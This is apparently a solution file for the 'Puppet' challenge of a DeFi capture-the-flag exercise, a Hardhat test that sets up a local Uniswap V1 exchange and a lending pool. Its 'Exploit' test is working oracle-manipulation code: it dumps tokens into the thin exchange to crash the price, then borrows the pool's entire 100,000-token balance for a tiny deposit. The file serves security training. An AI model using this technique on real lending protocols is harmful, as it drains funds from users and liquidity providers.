const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
    return tokensSold.mul(ethers.BigNumber.from('997')).mul(etherInReserve).div(
        (tokensInReserve.mul(ethers.BigNumber.from('1000')).add(tokensSold.mul(ethers.BigNumber.from('997'))))
    )
}

describe('[Challenge] Puppet', function () {
    let deployer, attacker;

    // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('10');
    const UNISWAP_INITIAL_ETH_RESERVE = ethers.utils.parseEther('10');

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000');
    const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther('25');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000')

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);

        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const PuppetPoolFactory = await ethers.getContractFactory('PuppetPool', deployer);

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x15af1d78b58c40000", // 25 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ATTACKER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        this.token = await DamnValuableTokenFactory.deploy();

        // Deploy a exchange that will be used as the factory template
        this.exchangeTemplate = await UniswapExchangeFactory.deploy();

        // Deploy factory, initializing it with the address of the template exchange
        this.uniswapFactory = await UniswapFactoryFactory.deploy();
        await this.uniswapFactory.initializeFactory(this.exchangeTemplate.address);

        // Create a new exchange for the token, and retrieve the deployed exchange's address
        let tx = await this.uniswapFactory.createExchange(this.token.address, { gasLimit: 1e6 });
        const { events } = await tx.wait();
        this.uniswapExchange = await UniswapExchangeFactory.attach(events[0].args.exchange);

        // Deploy the lending pool
        this.lendingPool = await PuppetPoolFactory.deploy(
            this.token.address,
            this.uniswapExchange.address
        );

        // Add initial token and ETH liquidity to the pool
        await this.token.approve(
            this.uniswapExchange.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await this.uniswapExchange.addLiquidity(
            0,                                                          // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
        );

        // Ensure Uniswap exchange is working as expected
        expect(
            await this.uniswapExchange.getTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                { gasLimit: 1e6 }
            )
        ).to.be.eq(
            calculateTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );

        // Setup initial token balances of pool and attacker account
        await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);//1000
        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);//10

        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        expect(
            await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther('1'))
        ).to.be.eq(ethers.utils.parseEther('2'));

        expect(
            await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul('2'));
    });

    it('Exploit', async function () {

        let tokenBalance = ethers.utils.formatEther(await this.token.balanceOf(attacker.address));
        let ethBalance = ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address));
        let tokenBalanceLendingPool = ethers.utils.formatEther(await this.token.balanceOf(this.lendingPool.address));
        let depositRequired = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);

        //Just printing some info to plan the attack
        console.log("###\tInfo at the beggining\t###");
        console.log("\nLending Pool Balance: ", tokenBalanceLendingPool);
        console.log("Deposit required for 100k: ", ethers.utils.formatEther(depositRequired),
            "\nAttacker Balance in Token: ", tokenBalance,
            "\nAttacker balance in ETH: ", ethBalance,
            "\nUniswap exchange balance in token: ", ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address)),
            "\nUniswap exchange balance in ETH: ", ethers.utils.formatEther(await ethers.provider.getBalance(this.uniswapExchange.address))
        );

        //I'm going to swap all my token to eth, thus, the price falls and I also have enough eth to spend
        //First I need to approve uniswapExchange to spend
        this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);

        //Then I swap token to eth using
        //'tokenToEthSwapInput(uint256,uint256,uint256)'
        this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
            ethers.utils.parseEther('999'),
            ethers.utils.parseEther('9'),
            (await ethers.provider.getBlock('latest')).timestamp * 2);

        tokenBalance = ethers.utils.formatEther(await this.token.balanceOf(attacker.address));
        ethBalance = ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address));

        console.log("\n###\tAfter Swap token->ETH\t###");
        console.log("\nAttacker Balance in Token: ", tokenBalance,
            "\nAttacker balance in ETH: ", ethBalance,
            "\nUniswap exchange balance: ", ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address)),
            "\nUniswap balance in ETH: ", ethers.utils.formatEther(await ethers.provider.getBalance(this.uniswapExchange.address))
        );

        depositRequired = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        console.log("\n###\tNow, lets check the swap impact\t### ");
        console.log(
            "Deposit Required: ", ethers.utils.formatEther(depositRequired),

        );

        this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: depositRequired });

        tokenBalance = ethers.utils.formatEther(await this.token.balanceOf(attacker.address));
        ethBalance = ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address));
        tokenBalanceLendingPool = ethers.utils.formatEther(await this.token.balanceOf(this.lendingPool.address));
        console.log("\n#####\tAFTER run borrow function\t#####");
        console.log(
            "\nAttacker Balance in Token: ", tokenBalance,
            "\nAttacker balance in ETH: ", ethBalance,
            "\nLending Pool balance: ", tokenBalanceLendingPool
        );

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool        
        expect(
            await this.token.balanceOf(this.lendingPool.address)
        ).to.be.eq('0');
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.gt(POOL_INITIAL_TOKEN_BALANCE);
    });
});